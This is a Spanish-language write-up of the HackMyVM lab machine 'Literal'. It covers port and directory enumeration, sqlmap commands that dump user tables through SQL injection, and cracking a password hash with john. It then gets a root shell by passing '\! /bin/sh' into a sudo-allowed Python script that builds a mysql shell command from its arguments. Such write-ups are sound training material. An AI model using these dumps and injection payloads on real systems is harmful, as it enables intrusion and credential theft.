---
layout: post
title: Literal - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Lanz \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/literal/literal.png#center)

## Reconocimiento

Tras una enumeración simple, veo que están abiertos los puertos 80 y 22.

```
$ sudo nmap -p- 192.168.1.67 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 04:58 EDT
Nmap scan report for blog.literal.hmv (192.168.1.67)
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:4C:64:E1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds
```

Al hacer una petición con **curl**, se puede ver que redirige automaticamente al subdominio "blog.literal.hmv" por lo que será necesario añadirlo a "/etc/hosts".

```
$ curl http://192.168.1.67                                
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://blog.literal.hmv">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.1.67 Port 80</address>
</body></html>
```

Una vez añadido el subdominio, procedo a realizar una busqueda de subdirectorios y ficheros con **gobuster**.
```
$ gobuster dir -u http://blog.literal.hmv/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[...]
===============================================================
2023/04/21 05:00:20 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 3325]
/.html                (Status: 403) [Size: 281]
/login.php            (Status: 200) [Size: 1893]
/register.php         (Status: 200) [Size: 2159]
/images               (Status: 301) [Size: 321] [--> http://blog.literal.hmv/images/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 320] [--> http://blog.literal.hmv/fonts/]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
```

Son interesantes los archivos "/login.php" y "/register.php".

Navego a "/register.php" y creo un nuevo usuario.
![img](/imgs/write-ups/hackmyvm/literal/literal_1.png#center)

Tras iniciar sesión, hago click en el siguiente botón.

![img](/imgs/write-ups/hackmyvm/literal/literal_2.png#center)

![img](/imgs/write-ups/hackmyvm/literal/literal_3.png#center)

Se puede ver un input que realiza una consulta sql sobre una base de datos con diferentes tareas.

## Explotación

Utilizo **sqlmap** en busca de una vulnerabilidad de SQLinjection.

```
$ sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=A*" -H "Cookie: PHPSESSID=<Cookie>" --batch -D blog -T users --dump
```

Resumiendo, obtengo estos usuarios, en los que me llama la atención el subdominio de algunos emails.

![img](/imgs/write-ups/hackmyvm/literal/literal_4.png#center)

Añado el subdominio a "/etc/hosts" y navego a ver que hay.

![img](/imgs/write-ups/hackmyvm/literal/literal_5.png#center)

Se puede ver un apartado de categoría que toma un id así que otra vez toca ir en busca de una vulnerabilidad SQLinjection.

```
sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --batch --level 5 --risk 3 -D forumtesting -T forum_owner --dump
```

![img](/imgs/write-ups/hackmyvm/literal/literal_6.png#center)

Bingo!! He obtenido el hash de una contraseña.

Ahora utilizando **john**, crackeo la contraseña.

```
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
forum******      (?)     
1g 0:00:00:01 DONE (2023-04-21 05:11) 0.9708g/s 7830Kp/s 7830Kc/s 7830KC/s fourbullet..formy6600
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña del foro es "forumXXXXXX" ¿La contraseña del servidor ssh seguirá el mismo formato? (Muchas gracias a PL4GU3 por la pista).

## Escalado de privilegios

Una vez dentro siendo el usuario Carlos, compruebo sus permisos de sudo con **sudo -l**.

```
carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
```

Como se puede ver, puede ejecutar el fichero "update_project_status.py" como el usuario root.

Este es el script:

```py
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

El script toma dos argumentos, el segundo es necesario que sea o "Done" o "Doing" o "To do". El primer argumento del script formará parte de la sentencia sql a ejecutar.

Por lo que se puede conseguir una shell de la siguiente manera.

```
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '\! /bin/sh' Done
[+] Before update project (\! /bin/sh)

# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
literal
# :)
```

Root conseguido!!

Muchas gracias a **Lanz** por esta máquina.
